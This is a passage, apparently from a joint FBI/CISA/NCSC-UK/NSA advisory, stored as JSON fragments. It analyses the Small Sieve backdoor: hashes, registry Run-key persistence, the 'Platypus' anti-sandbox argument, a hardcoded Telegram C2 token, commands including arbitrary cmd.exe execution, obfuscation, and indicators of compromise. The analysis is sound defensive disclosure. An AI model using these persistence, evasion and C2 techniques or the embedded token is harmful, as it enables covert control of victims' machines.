+  "text": "Filename                 index.exe\n        Description              The final PyInstaller-bundled Python 3.9 backdoor\n        Size                     17263089 bytes\n        MD5                      5763530f25ed0ec08fb26a30c04009f1\n        SHA-1                    2a6ddf89a8366a262b56a251b00aafaed5321992\n        SHA-256                  bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37\n                                 d3a2\n        Compile Time             2021-08-01 04:39:46 UTC"
+ },
+ {
+  "id": "p80",
+  "text": "Functionality\n       Installation\n       Small Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe, which does not\n       appear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe is\n       installed in the user’s AppData/Roaming directory and is added as a Run key in the registry to\n       enabled persistence after reboot.\n       The installer then executes the backdoor with the “Platypus” argument [T1480], which is also present\n       in the registry persistence key:\n       HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift."
+ },
+ {
+  "id": "p81",
+  "text": "TLP:WHITE                                                                                         FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p82",
+  "text": "Configuration\n       The backdoor attempts to restore previously initialized session data from\n       %LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt.\n       If this file does not exist, then it uses the hardcoded values listed in table 4:\n                                         Table 4: Credentials and Session Values"
+ },
+ {
+  "id": "p83",
+  "text": "Field                        Value                           Description\n           Chat ID                      2090761833                      This is the Telegram Channel ID that\n                                                                        beacons are sent to, and, from which,\n                                                                        tasking requests are received. Tasking\n                                                                        requests are dropped if they do not\n                                                                        come from this channel. This value\n                                                                        cannot be changed.\n           Bot ID                       Random value between            This is a bot identifier generated at\n                                        10,000,000 and                  startup that is sent to the C2 in the\n                                        90,000,000                      initial beacon. Commands must be\n                                                                        prefixed with /com[Bot ID] in order\n                                                                        to be processed by the malware.\n           Telegram Token               2003026094:                     This is the initial token used to\n                                        AAGoitvpcx3SFZ2_6YzIs4          authenticate each message to the\n                                        La_kyDF1PbXrY                   Telegram Bot API."
+ },
+ {
+  "id": "p84",
+  "text": "Tasking\n       Small Sieve beacons via the Telegram Bot API, sending the configured Bot ID, the currently logged-in\n       user, and the host’s IP address, as described in the Communications (Beacon format) section below.\n       It then waits for tasking as a Telegram bot using the python-telegram-bot module.\n       Two task formats are supported:\n       •     /start – no argument is passed; this causes the beacon information to be repeated.\n       •     /com[BotID] [command] – for issuing commands passed in the argument."
+ },
+ {
+  "id": "p85",
+  "text": "The following commands are supported by the second of these formats, as described in table 5: Com\n                                             Table 5: Supported Commands"
+ },
+ {
+  "id": "p86",
+  "text": "Command                                         Description\n           delete                                          This command causes the backdoor to exit; it does\n                                                           not remove persistence.\n           download url””filename                          The URL will be fetched and saved to the provided\n                                                           filename using the Python urllib module\n                                                           urlretrieve function."
+ },
+ {
+  "id": "p87",
+  "text": "TLP:WHITE                                                                                  FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p88",
+  "text": "change token””newtoken                       The backdoor will reconnect to the Telegram Bot\n                                                     API using the provided token newtoken. This\n                                                     updated token will be stored in the encoded\n                                                     MicrosoftWindowsOutlookDataPlus.txt file.\n        disconnect                                   The original connection to Telegram is terminated.\n                                                     It is likely used after a change token command is\n                                                     issued."
+ },
+ {
+  "id": "p89",
+  "text": "Any commands other than those detailed in table 5 are executed directly by passing them to cmd.exe\n       /c, and the output is returned as a reply."
+ },
+ {
+  "id": "p90",
+  "text": "Defense Evasion\n       Anti-Sandbox"
+ },
+ {
+  "id": "p91",
+  "text": "Figure 1: Execution Guardrail"
+ },
+ {
+  "id": "p92",
+  "text": "Threat actors may be attempting to thwart simple analysis by not passing “Platypus” on the command\n       line.\n       String obfuscation\n       Internal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64-\n       encoded. A decryption script is included in Appendix B."
+ },
+ {
+  "id": "p93",
+  "text": "Communications\n       Beacon Format\n       Before listening for tasking using CommandHandler objects from the python-telegram-bot module, a\n       beacon is generated manually using the standard requests library:"
+ },
+ {
+  "id": "p94",
+  "text": "TLP:WHITE                                                                                          FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p95",
+  "text": "Figure 2: Manually Generated Beacon"
+ },
+ {
+  "id": "p96",
+  "text": "The hex host data is encoded using the byte shuffling algorithm as described in the “Communications\n       (Traffic obfuscation)” section of this report. The example in figure 2 decodes to:\n                                          admin/WINDOMAIN1 | 10.17.32.18\n       Traffic obfuscation\n       Although traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and\n       response using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3."
+ },
+ {
+  "id": "p97",
+  "text": "Figure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling"
+ },
+ {
+  "id": "p98",
+  "text": "Detection\n       Table 6 outlines indicators of compromise.\n                                            Table 6: Indicators of Compromise"
+ },
+ {
+  "id": "p99",
+  "text": "Type                            Description                 Values\n        Path                            Telegram Session            %LocalAppData%\\MicrosoftWindowsOut\n                                        Persistence File            lookDataPlus.txt\n                                        (Obfuscated)\n        Path                            Installation path of the    %AppData%\\OutlookMicrosift\\index.e\n                                        Small Sieve binary          xe"
+ },
+ {
+  "id": "p100",
+  "text": "TLP:WHITE                                                                                  FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p101",
+  "text": "Registry value name             Persistence Registry Key     HKCU\\Software\\Microsoft\\Windows\\Cu\n                                        pointing to index.exe with   rrentVersion\\Run\\OutlookMicrosift\n                                        a “Platypus” argument"
+ },
+ {
+  "id": "p102",
+  "text": "String Recover Script"
+ },
+ {
+  "id": "p103",
+  "text": "Figure 4: String Recovery Script"
+ }
+]
